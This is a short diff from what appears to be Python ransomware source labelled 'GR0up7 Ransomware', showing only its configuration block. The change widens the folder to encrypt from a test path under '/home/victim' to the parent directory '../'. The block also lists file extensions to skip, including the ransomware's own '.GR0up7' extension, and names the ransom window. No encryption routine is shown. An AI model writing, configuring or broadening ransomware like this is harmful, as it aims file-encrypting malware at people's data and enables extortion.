@@ -23,7 +23,7 @@ from PIL import ImageTk, Image
 KEEP_ACTIVE_WINDOW_TIME = 20
 
 # ENCRYPT_FOLDER_PATH = "../Documents"
-ENCRYPT_FOLDER_PATH = "/home/victim/Desktop/TestFolder"  # CHANGE THIS
+ENCRYPT_FOLDER_PATH = "../"  # CHANGE THIS
 EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe', '.so', '.GR0up7']  # CHANGE THIS
 RANWOMWARE_WINDOW_NAME = 'GR0up7 Ransomware'  # CHANGE THIS
 
